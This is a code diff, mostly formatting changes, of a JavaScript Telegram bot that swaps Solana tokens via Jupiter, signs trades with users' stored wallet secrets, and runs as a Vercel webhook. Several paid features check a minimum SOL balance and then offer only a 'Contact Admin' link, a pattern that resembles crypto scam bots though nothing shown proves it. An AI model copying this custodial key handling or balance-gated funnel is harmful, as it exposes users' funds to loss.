             `✅ <b>Swap Successful!</b>\n\nBought token for <b>${amount} SOL</b>\nReceived roughly: <b>${result.outAmount}</b> tokens\n\nTx Hash: <a href="https://solscan.io/tx/${result.signature}">${result.signature.substring(0, 8)}...</a>`,
-            { parse_mode: "HTML", reply_markup: { inline_keyboard: [[Markup.button.callback("⬅️ Main Menu", "BACK_MAIN")]] } }
+            {
+              parse_mode: "HTML",
+              reply_markup: {
+                inline_keyboard: [
+                  [Markup.button.callback("⬅️ Main Menu", "BACK_MAIN")],
+                ],
+              },
+            },
           );
         } else {
           throw new Error(result.error || "Unknown swap error");
@@ -3857,10 +3997,17 @@ bot.action(/.*/, async (ctx) => {
           msg.message_id,
           undefined,
           `❌ <b>Swap Failed</b>\n\nError: ${e.message}`,
-          { parse_mode: "HTML", reply_markup: { inline_keyboard: [[Markup.button.callback("⬅️ Main Menu", "BACK_MAIN")]] } }
+          {
+            parse_mode: "HTML",
+            reply_markup: {
+              inline_keyboard: [
+                [Markup.button.callback("⬅️ Main Menu", "BACK_MAIN")],
+              ],
+            },
+          },
         );
       }
-      
+
       // Clear selected token after attempt
       ctx.session.selectedToken = null;
     } else {
@@ -3875,7 +4022,7 @@ bot.action(/.*/, async (ctx) => {
             [Markup.button.callback("⭐ Profiles", "NEW_PAIRS")],
             [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
           ]).reply_markup,
-        }
+        },
       );
     }
   } else if (ctx.match.input === "BUY_CUSTOM") {
@@ -3890,7 +4037,7 @@ bot.action(/.*/, async (ctx) => {
           [Markup.button.callback("🔥 Trending", "TRENDING")],
           [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
         ]).reply_markup,
-      }
+      },
     );
   } else if (ctx.match.input === "CONTINUE") {
     await ctx.deleteMessage();
@@ -3902,7 +4049,10 @@ bot.action(/.*/, async (ctx) => {
     const selectedToken = ctx.session?.selectedToken;
 
     if (selectedToken) {
-      const msg = await ctx.editMessageText(`🔄 <b>Processing Swap...</b>\nSelling ${pct}% of token via Jupiter Ultra...`, { parse_mode: "HTML" });
+      const msg = await ctx.editMessageText(
+        `🔄 <b>Processing Swap...</b>\nSelling ${pct}% of token via Jupiter Ultra...`,
+        { parse_mode: "HTML" },
+      );
       try {
         const userData = sessionManager.getUserData(ctx);
         const secret = userData?.wallet;
@@ -3911,14 +4061,14 @@ bot.action(/.*/, async (ctx) => {
 
         // 1. Get token balance
         const tokens = await utils.getTokenBalances(userWalletAddress);
-        const tokenData = tokens.find(t => t.mint === selectedToken);
+        const tokenData = tokens.find((t) => t.mint === selectedToken);
 
         if (!tokenData || tokenData.balance <= 0) {
           throw new Error("You don't have any balance of this token.");
         }
 
         // 2. Calculate sell amount
-        const amountToSell = (tokenData.balance * (pct / 100));
+        const amountToSell = tokenData.balance * (pct / 100);
 
         // 3. Execute Swap
         const result = await executeJupiterSwap({
@@ -3932,7 +4082,7 @@ bot.action(/.*/, async (ctx) => {
             tx.sign([keypair]);
             return tx;
           },
-          dryRun: false
+          dryRun: false,
         });
 
         if (result.success) {
@@ -3941,7 +4091,14 @@ bot.action(/.*/, async (ctx) => {
             msg.message_id,
             undefined,
             `✅ <b>Swap Successful!</b>\n\nSold <b>${amountToSell}</b> tokens\nReceived roughly: <b>${result.outAmount} SOL</b>\n\nTx Hash: <a href="https://solscan.io/tx/${result.signature}">${result.signature.substring(0, 8)}...</a>`,
-            { parse_mode: "HTML", reply_markup: { inline_keyboard: [[Markup.button.callback("⬅️ Main Menu", "BACK_MAIN")]] } }
+            {
+              parse_mode: "HTML",
+              reply_markup: {
+                inline_keyboard: [
+                  [Markup.button.callback("⬅️ Main Menu", "BACK_MAIN")],
+                ],
+              },
+            },
           );
         } else {
           throw new Error(result.error || "Unknown swap error");
@@ -3953,10 +4110,17 @@ bot.action(/.*/, async (ctx) => {
           msg.message_id,
           undefined,
           `❌ <b>Swap Failed</b>\n\nError: ${e.message}`,
-          { parse_mode: "HTML", reply_markup: { inline_keyboard: [[Markup.button.callback("⬅️ Main Menu", "BACK_MAIN")]] } }
+          {
+            parse_mode: "HTML",
+            reply_markup: {
+              inline_keyboard: [
+                [Markup.button.callback("⬅️ Main Menu", "BACK_MAIN")],
+              ],
+            },
+          },
         );
       }
-      
+
       ctx.session.selectedToken = null;
     } else {
       await ctx.editMessageText(
@@ -3967,7 +4131,7 @@ bot.action(/.*/, async (ctx) => {
             [Markup.button.callback("📊 My Positions", "POSITIONS")],
             [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
           ]).reply_markup,
-        }
+        },
       );
     }
   } else if (ctx.match.input === "CLOSE_ALL_POSITIONS") {
@@ -3982,7 +4146,7 @@ bot.action(/.*/, async (ctx) => {
           [Markup.button.callback("❌ Cancel", "POSITIONS")],
           [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
         ]).reply_markup,
-      }
+      },
     );
   } else if (ctx.match.input === "NEW_LIMIT_ORDER") {
     if (!(await requireWallet(ctx, "New Limit Order"))) return;
@@ -3995,7 +4159,7 @@ bot.action(/.*/, async (ctx) => {
           [Markup.button.callback("📊 View Orders", "LIMIT_ORDERS")],
           [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
         ]).reply_markup,
-      }
+      },
     );
   } else if (ctx.match.input === "NEW_DCA_ORDER") {
     if (!(await requireWallet(ctx, "New DCA Order"))) return;
@@ -4008,7 +4172,7 @@ bot.action(/.*/, async (ctx) => {
           [Markup.button.callback("📊 View DCA", "DCA_ORDERS")],
           [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
         ]).reply_markup,
-      }
+      },
     );
   } else if (ctx.match.input === "COPY_CRYPTOWHALE") {
     if (!(await requireWallet(ctx, "Copy CryptoWhale"))) return;
@@ -4023,7 +4187,7 @@ bot.action(/.*/, async (ctx) => {
           [Markup.button.callback("📊 Performance", "WHALE_PERFORMANCE")],
           [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
         ]).reply_markup,
-      }
+      },
     );
   } else if (ctx.match.input === "START_SNIPER") {
     if (!(await requireFeatureBalance(ctx, "LP Sniper", 0.5))) return;
@@ -4033,12 +4197,20 @@ bot.action(/.*/, async (ctx) => {
       {
         parse_mode: "HTML",
         reply_markup: Markup.inlineKeyboard([
-          [Markup.button.url("Contact Admin to Complete Setup", "https://t.me/spambot")],
+          [
+            Markup.button.url(
+              "Contact Admin to Complete Setup",
+              "https://t.me/spambot",
+            ),
+          ],
           [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
         ]).reply_markup,
-      }
+      },
     );
-  } else if (ctx.match.input === "QUICK_LAUNCH" || ctx.match.input === "CUSTOM_LAUNCH") {
+  } else if (
+    ctx.match.input === "QUICK_LAUNCH" ||
+    ctx.match.input === "CUSTOM_LAUNCH"
+  ) {
     if (!(await requireFeatureBalance(ctx, "Token Launch", 5.0))) return;
 
     await ctx.editMessageText(
@@ -4046,10 +4218,15 @@ bot.action(/.*/, async (ctx) => {
       {
         parse_mode: "HTML",
         reply_markup: Markup.inlineKeyboard([
-          [Markup.button.url("Contact Admin to Complete Setup", "https://t.me/spambot")],
+          [
+            Markup.button.url(
+              "Contact Admin to Complete Setup",
+              "https://t.me/spambot",
+            ),
+          ],
           [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
         ]).reply_markup,
-      }
+      },
     );
   } else if (ctx.match.input === "CLAIM_ALL_AIRDROPS") {
     if (!(await requireFeatureBalance(ctx, "Claim Airdrop", 0.1))) return;
@@ -4059,10 +4236,15 @@ bot.action(/.*/, async (ctx) => {
       {
         parse_mode: "HTML",
         reply_markup: Markup.inlineKeyboard([
-          [Markup.button.url("Contact Admin to Complete Setup", "https://t.me/spambot")],
+          [
+            Markup.button.url(
+              "Contact Admin to Complete Setup",
+              "https://t.me/spambot",
+            ),
+          ],
           [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
         ]).reply_markup,
-      }
+      },
     );
   } else if (ctx.match.input === "BRIDGE_SOL_TO_ETH") {
     if (!(await requireWallet(ctx, "Bridge SOL to ETH"))) return;
@@ -4077,7 +4259,7 @@ bot.action(/.*/, async (ctx) => {
           [Markup.button.callback("🌉 Custom Amount", "BRIDGE_CUSTOM")],
           [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
         ]).reply_markup,
-      }
+      },
     );
   } else if (ctx.match.input === "WITHDRAW_0.5") {
     if (!(await requireWallet(ctx, "Withdraw 0.5 SOL"))) return;
@@ -4091,7 +4273,7 @@ bot.action(/.*/, async (ctx) => {
           [Markup.button.callback("💸 Other Amount", "WITHDRAW")],
           [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
         ]).reply_markup,
-      }
+      },
     );
   } else if (ctx.match.input === "AUTO_TRADE_PUMPFUN") {
     const userData = sessionManager.getUserData(ctx);
@@ -4118,7 +4300,7 @@ bot.action(/.*/, async (ctx) => {
                 [Markup.button.callback("💰 Add Balance", "ADD_FUNDS")],
                 [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
               ]).reply_markup,
-            }
+            },
           );
         } else {
           await ctx.editMessageText(
@@ -4129,7 +4311,7 @@ bot.action(/.*/, async (ctx) => {
                 [Markup.button.callback("🔗 Connect Wallet", "CONNECT_WALLET")],
                 [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
               ]).reply_markup,
-            }
+            },
           );
         }
       } catch (error) {
@@ -4141,7 +4323,7 @@ bot.action(/.*/, async (ctx) => {
               [Markup.button.callback("🔗 Connect Wallet", "CONNECT_WALLET")],
               [Markup.button.callback("⬅️ Back", "BACK_MAIN")],
             ]).reply_markup,
-          }
+          },
         );
       }
     }
@@ -4151,21 +4333,21 @@ bot.action(/.*/, async (ctx) => {
 // Export Vercel serverless function
 export default async function handle(req, res) {
   try {
-    if (req.method === 'POST') {
+    if (req.method === "POST") {
       // Process Telegram updates
       await bot.handleUpdate(req.body, res);
-    } else if (req.query.setup === '1') {
+    } else if (req.query.setup === "1") {
       // Setup Webhook URL when visited with ?setup=1
-      const protocol = req.headers['x-forwarded-proto'] || 'https';
+      const protocol = req.headers["x-forwarded-proto"] || "https";
       const webhookUrl = `${protocol}://${req.headers.host}/api/webhook`;
       await bot.telegram.setWebhook(webhookUrl);
       res.status(200).send(`Webhook successfully set to ${webhookUrl}`);
     } else {
-      res.status(200).send('Telegram Bot is running! 🚀');
+      res.status(200).send("Telegram Bot is running! 🚀");
     }
   } catch (error) {
-    console.error('Webhook error:', error);
+    console.error("Webhook error:", error);
     // Return 200 even on error so Telegram doesn't aggressively retry on our failure if not needed
-    res.status(200).send('Error');
+    res.status(200).send("Error");
   }
 }
